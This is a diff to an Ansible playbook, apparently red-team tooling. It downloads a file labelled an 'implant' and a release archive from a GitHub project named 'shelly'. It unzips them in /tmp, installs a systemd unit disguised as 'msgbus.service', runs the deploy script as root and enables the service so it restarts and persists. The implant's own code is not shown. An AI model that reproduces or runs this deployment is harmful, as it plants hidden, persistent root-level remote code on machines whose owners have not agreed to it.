@@ -5,9 +5,9 @@
   vars:
     implant_url: "https://github.com/vaughnw128/shelly/releases/download/v0.0.6/implant"
     release_url: "https://github.com/vaughnw128/shelly/archive/refs/tags/v0.0.6.zip"
+    shelly_version: "shelly-0.0.6"
   remote_user: ansible
   become: yes
-  sudo: yes
   tasks:
 
     - name: download implant
@@ -19,24 +19,25 @@
       
     - name: download deploy scripts
       ansible.builtin.get_url:
-        url: "{{ deploy_url }}"
-        dest: "/tmp/shelly"
+        url: "{{ release_url }}"
+        dest: "/tmp/shelly.zip"
         mode: '0777'
         owner: root
         
-    # - name: unarchive deploy scripts
-    #   unarchive:
-    #     src: "/tmp/deploy.zip"
-    #     dest: "/tmp"
-    #     mode: 0755
+    - name: unarchive deploy scripts
+      unarchive:
+        remote_src: yes
+        src: "/tmp/shelly.zip"
+        dest: "/tmp/"
+        mode: 0755
 
-    # - name: Copy systemd job to systemd 
-    #   copy: remote_src=True src=/tmp/msgbus.service dest=/etc/systemd/system/msgbus.service
+    - name: Copy systemd job to systemd 
+      copy: remote_src=True src=/tmp/{{ shelly_version }}/deploy/msgbus.service dest=/etc/systemd/system/msgbus.service
 
-    # - name: Execute the deploy script
-    #   command: sh /tmp/deploy.sh
+    - name: Execute the deploy script
+      command: sh /tmp/{{ shelly_version }}/deploy/deploy.sh
 
-    # # Starts the systemd service for msgbus
-    # - name: start systemd app service
-    #   systemd: name=msgbus.service state=restarted enabled=yes
-    #   become: yes
+        # Starts the systemd service for msgbus
+    - name: start systemd app service
+      systemd: name=msgbus.service state=restarted enabled=yes
+      become: yes
